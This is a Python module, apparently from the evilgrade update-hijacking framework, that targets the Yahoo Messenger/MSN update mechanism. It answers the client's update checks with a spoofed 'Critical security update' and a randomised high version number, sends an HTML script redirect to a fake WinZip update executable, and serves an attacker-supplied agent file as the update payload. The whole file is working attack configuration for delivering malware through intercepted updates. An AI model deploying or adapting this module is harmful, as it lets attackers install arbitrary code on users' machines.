from modules import ModuleBase


class YahooMSN(ModuleBase):
    name = 'YahooMSN'
    version = '1.0'
    appver = '< 11.0'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    vh = 'download.yimg.com' 
    enabled = False
    agent_filename = './agent/agent.cab'
    options = {
        'description': {
            'val': 'Critical security update',
            'desc': 'Description display in the update'
        },
        'version': {
            'val': "'30.' + rand_num(1) + '.' + rand_num(4) + '.' + rand_num(1)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
    requests = [{
            'path': '(/updates/wnzpes.txt|/cgi\-bin/updateinfo.cgi)',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string' : "<%VERSION%>\n\\n\\n<%DESCRIPTION%>",
            'parse': 1,
            'file': '',
        }, {
            'path': '/dnldwz.cgi',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': '<html><script>window.location="http://update.winzip.com/winzipupdate<%RND1%>.exe"</script></html>',
            'parse': 1,
            'file': '',
        }, {
            'path': '.yim',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }]
